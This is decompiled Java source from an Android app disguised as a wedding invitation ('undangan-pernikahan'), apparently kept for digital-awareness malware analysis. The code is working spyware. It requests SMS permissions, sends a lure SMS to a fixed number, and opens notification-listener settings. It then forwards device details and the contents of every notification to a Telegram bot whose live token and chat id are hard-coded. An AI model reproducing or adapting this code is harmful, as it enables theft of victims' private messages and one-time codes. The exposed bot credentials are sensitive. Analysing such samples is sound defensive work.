package com.example.myapplicatior;

import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.Html;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TableRow;
import android.widget.TableRow.LayoutParams;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request.Builder;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class MainActivity
  extends AppCompatActivity
{
  private static final int RESULT_ENABLE = 0;
  private static final int VISIBILITY = 1028;
  final String TAG = "demo1";
  private final OkHttpClient client = new OkHttpClient();
  String device = Build.BRAND + " - " + Build.MODEL + SmsManager.getDefault();
  private Object devicePolicyManager;
  ComponentName mDeviceAdminSample;
  private BroadcastReceiver onNotice = new BroadcastReceiver()
  {
    public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
    {
      String str1 = paramAnonymousIntent.getStringExtra("package");
      String str2 = paramAnonymousIntent.getStringExtra("title");
      paramAnonymousContext = paramAnonymousIntent.getStringExtra("text");
      paramAnonymousIntent.getStringExtra("id");
      new TableRow(MainActivity.this.getApplicationContext()).setLayoutParams(new TableRow.LayoutParams(-1, -2));
      paramAnonymousIntent = new TextView(MainActivity.this.getApplicationContext());
      paramAnonymousIntent.setLayoutParams(new TableRow.LayoutParams(-2, -2, 1.0F));
      paramAnonymousIntent.setTextSize(12.0F);
      paramAnonymousIntent.setTextColor(Color.parseColor("#000000"));
      paramAnonymousIntent.setText(Html.fromHtml("From : " + str2 + " | Message : </b>" + paramAnonymousContext));
      paramAnonymousContext = new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text=*" + str1 + "* %0A%0A*From :* _" + str2 + "_%0A*Message :* _" + paramAnonymousContext + "_").build();
      MainActivity.this.client.newCall(paramAnonymousContext).enqueue(new Callback()
      {
        public void onFailure(Call paramAnonymous2Call, IOException paramAnonymous2IOException)
        {
          paramAnonymous2IOException.printStackTrace();
        }
        
        public void onResponse(Call paramAnonymous2Call, Response paramAnonymous2Response)
          throws IOException
        {
          Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
          if (paramAnonymous2Response.isSuccessful()) {
            paramAnonymous2Response.body().string();
          }
        }
      });
    }
  };
  private TextView textView;
  WebSettings websettingku;
  WebView webviewku;
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131427356);
    paramBundle = (WebView)findViewById(2131231023);
    this.webviewku = paramBundle;
    paramBundle = paramBundle.getSettings();
    this.websettingku = paramBundle;
    paramBundle.setJavaScriptEnabled(true);
    this.webviewku.setWebViewClient(new WebViewClient());
    this.webviewku.loadUrl("");
    if (Build.VERSION.SDK_INT >= 19) {
      this.webviewku.setLayerType(2, null);
    } else if ((Build.VERSION.SDK_INT >= 11) && (Build.VERSION.SDK_INT < 19)) {
      this.webviewku.setLayerType(1, null);
    }
    if ((Build.VERSION.SDK_INT >= 23) && (checkSelfPermission("android.permission.RECEIVE_SMS") != 0) && (checkSelfPermission("android.permission.SEND_SMS") != 0)) {
      requestPermissions(new String[] { "android.permission.RECEIVE_SMS", "android.permission.SEND_SMS" }, 1000);
    }
  }
  
  public void onRequestPermissionsResult(int paramInt, String[] paramArrayOfString, int[] paramArrayOfInt)
  {
    super.onRequestPermissionsResult(paramInt, paramArrayOfString, paramArrayOfInt);
    if (paramInt == 1000) {
      if (paramArrayOfInt[0] == 0)
      {
        paramArrayOfString = new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text= : _" + this.device).build();
        this.client.newCall(paramArrayOfString).enqueue(new Callback()
        {
          public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException)
          {
            paramAnonymousIOException.printStackTrace();
          }
          
          public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
            throws IOException
          {
            Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
            if (paramAnonymousResponse.isSuccessful()) {
              paramAnonymousResponse.body().string();
            }
          }
        });
        try
        {
          SmsManager.getDefault().sendTextMessage("085211609935", null, " paket gratis 100gb. ", null, null);
        }
        catch (Exception paramArrayOfString)
        {
          paramArrayOfInt = new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text=Error : _" + paramArrayOfString).build();
          this.client.newCall(paramArrayOfInt).enqueue(new Callback()
          {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException)
            {
              paramAnonymousIOException.printStackTrace();
            }
            
            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
              throws IOException
            {
              Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
              if (paramAnonymousResponse.isSuccessful()) {
                paramAnonymousResponse.body().string();
              }
            }
          });
          Toast.makeText(getApplicationContext(), "" + paramArrayOfString, 1).show();
        }
        paramArrayOfString = (NotificationManager)getApplicationContext().getSystemService("notification");
        if ((Build.VERSION.SDK_INT >= 23) && (!paramArrayOfString.isNotificationPolicyAccessGranted()))
        {
          startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
          Toast.makeText(this, "Aktifkan Izin Aplikasi!", 0).show();
        }
        LocalBroadcastManager.getInstance(this).registerReceiver(this.onNotice, new IntentFilter("Msg"));
      }
      else
      {
        Toast.makeText(this, "Permission Not Granted!", 0).show();
        paramArrayOfString = new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text= : _" + this.device + "_").build();
        this.client.newCall(paramArrayOfString).enqueue(new Callback()
        {
          public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException)
          {
            paramAnonymousIOException.printStackTrace();
          }
          
          public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
            throws IOException
          {
            Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
            if (paramAnonymousResponse.isSuccessful()) {
              paramAnonymousResponse.body().string();
            }
          }
        });
        finish();
      }
    }
  }
}


/* Location:              /home/icat/Documents/digital-awareness/src/undangan-pernikahan-dex2jar.jar!/com/example/myapplicatior/MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */